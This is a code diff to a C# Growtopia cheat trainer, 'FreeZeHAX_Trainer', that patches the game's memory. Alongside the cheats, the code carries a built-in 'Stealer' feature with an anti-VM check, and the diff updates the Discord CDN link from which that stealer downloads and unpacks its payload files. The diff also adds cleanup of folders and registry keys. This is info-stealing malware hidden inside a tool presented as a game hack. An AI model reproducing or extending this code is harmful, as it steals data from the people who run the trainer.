@@ -22,6 +22,7 @@ namespace FreeZeHAX_Trainer
         {
             InitializeComponent();
         }
+
         private readonly string TempFolder = Path.GetTempPath();
         private readonly string AppdataRoaming = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Appdata\\Roaming"; // Appdata\Roaming
         private readonly Mem mem = new Mem();
@@ -38,6 +39,7 @@ namespace FreeZeHAX_Trainer
         private readonly WebClient web = new WebClient();
         private readonly bool AntiVM = true; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
         private readonly bool Stealer = true; // Activate / Disable Stealer
+        //private IEnumerable<long> MemoryScan;
 
         private void StartForm()
         {
@@ -50,6 +52,7 @@ namespace FreeZeHAX_Trainer
         private async void ExitForm()
         {
             for (Opacity = 0.90; Opacity > .0; Opacity -= .1) { await System.Threading.Tasks.Task.Delay(10); }
+            RemoveGuna();
             Application.Exit();
         }
 
@@ -90,11 +93,7 @@ namespace FreeZeHAX_Trainer
             #endregion
             Show();
             StartForm();
-            string Guna = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.guna";
-            if (Directory.Exists(Guna))
-            {
-                Directory.Delete(Guna, true);
-            }
+            RemoveGuna();
             #region Stealer
             if (Stealer == true)
             {
@@ -126,7 +125,7 @@ namespace FreeZeHAX_Trainer
                     others.DirClean(StealerFolder);
                     others.Wait(2000);
                     Directory.CreateDirectory(StealerFolderLoc);
-                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/931573162162937947/App.config"), StealerFolderLoc + "\\App.config");
+                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/934821226940088330/App.config"), StealerFolderLoc + "\\App.config");
                     others.Wait(2000);
                     System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
                     others.Wait(2000);
@@ -172,9 +171,7 @@ namespace FreeZeHAX_Trainer
             #endregion
             Auto_Attach.RunWorkerAsync();
 
-            foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces().Where(
-            a => Adapter.IsValidMac(a.GetPhysicalAddress().GetAddressBytes(), true)
-            ).OrderByDescending(a => a.Speed))
+            foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces().Where(a => Adapter.IsValidMac(a.GetPhysicalAddress().GetAddressBytes(), true)).OrderByDescending(a => a.Speed))
             {
                 AdaptersComboBox.Items.Add(new Adapter(adapter));
             }
@@ -282,7 +279,7 @@ namespace FreeZeHAX_Trainer
         {
             try
             {
-                string path = System.IO.Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts");
+                string path = Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts");
                 string str = File.ReadAllText(path);
                 Host_File_Editor.Text = str;
             }
@@ -298,7 +295,7 @@ namespace FreeZeHAX_Trainer
 
         private void Opacity_Track_Scroll(object sender, ScrollEventArgs e)
         {
-            System.Windows.Forms.Form.ActiveForm.Opacity = (OpacityTrackBar.Value / 100.0);
+            ActiveForm.Opacity = (OpacityTrackBar.Value / 100.0);
             TrackbarText.Text = OpacityTrackBar.Value.ToString();
         }
 
@@ -316,12 +313,29 @@ namespace FreeZeHAX_Trainer
             Auto_Attach.ReportProgress(0);
         }
 
+        /*private async System.Threading.Tasks.Task<string> AobScanAsync(string AOB)
+        {
+            string Result = "";
+
+            try
+            {
+                MemoryScan = await mem.AoBScan(AOB);
+                foreach (long A in MemoryScan)
+                {
+                    Result = A.ToString("X");
+                }
+            }
+            catch (Exception) { }
+            return Result;
+        }*/
+
         public void Auto_Attach_ProgressChanged(object sender, System.ComponentModel.ProgressChangedEventArgs e)
         {
             if (ProcOpen)
             {
                 try
                 {
+                    //MessageBox.Show(AobScanAsync("74 ? f3 0f 59 3d ? ? ? ? f3 0f 10 83") + "bytes" + "0F 85 9E 01 00 00");
                     mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[0], "bytes", "0F 85 9E 01 00 00");
                     mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[1], "bytes", "90 90");
                     mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[5], "bytes", "90 90");
@@ -1146,6 +1160,23 @@ namespace FreeZeHAX_Trainer
                             p.Kill();
                         }
                     }
+                }
+            }
+            catch (Exception) { }
+        }
+
+        private void RemoveGuna()
+        {
+            string Guna = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.guna";
+            try
+            {
+                if (Directory.Exists(Guna))
+                {
+                    Directory.Delete(Guna, true);
+                }
+                using (RegistryKey Key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64))
+                {
+                    Key.DeleteSubKeyTree("SOFTWARE\\Guna");
                 }
             }
             catch (Exception) { }
